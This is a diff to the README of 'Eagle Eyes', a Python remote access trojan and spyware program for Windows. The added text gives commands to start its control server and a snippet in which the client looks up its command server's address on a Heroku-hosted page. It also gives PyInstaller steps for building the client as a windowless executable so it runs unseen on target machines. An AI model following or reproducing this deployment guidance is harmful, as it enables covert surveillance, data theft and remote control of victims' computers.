@@ -3,7 +3,34 @@ Eagle Eyes => A powerful low level TCP networking RAT written in the Python lang
 ___
 Eagle Eyes is a spyware Python program created for Windows that supports multiple ways to collect data & automatically save everything organized in folders. It has two shells you will use, the first shell is to control & manage clients & options. It is also from this shell you have can connect to a client session. This will give a reverse shell like connection to a specific client with extra built in commands.
 ___
-Supported Features:
+## Examples of running the server script:
+- Python server.py
+- Python server.py -h
+- Python server.py -ip 169.252.134.102 -p 1300 -mP 1301,1302,1303,1304,1305
+- Python server.py -uL
+- Python server.py -u Enes -t hacker
+## Examples of running the client script:
+- Python client.py
+___
+## Tips
+Your server address might be changing when specifying it in the client script so you can use a webserver to host the data & simply updating the webserver. To specify this you simply setup a webserver with on https://heroku.com & make a request to the server by passing in the constructor of the Client class at the bottom of the client.py script. 
+
+__Example of this__
+
+data = requests.get('https://your_app_name.herokuapp.com/').json()
+client = Client(data['ip'], data['port'], data['encoding'])
+___
+## Making the script an exe
+__To make your script an exe you can use Pyinstaller with "pip install pyinstaller".__
+
+Here are some examples of creating the executeable:
+
+- pyinstaller -F -i server.ico server.py
+Using the "server.ico" as icon with "-i" & making it a single file with "-F".
+- pyinstaller -F -w -i client.ico client.py
+Also using "-w" when building the client script to make it a windowless application.
+___
+### Supported Features:
   - TCP Network stream (IPv4)
   - Compression & AES256 Encryption
   - Multi Threaded
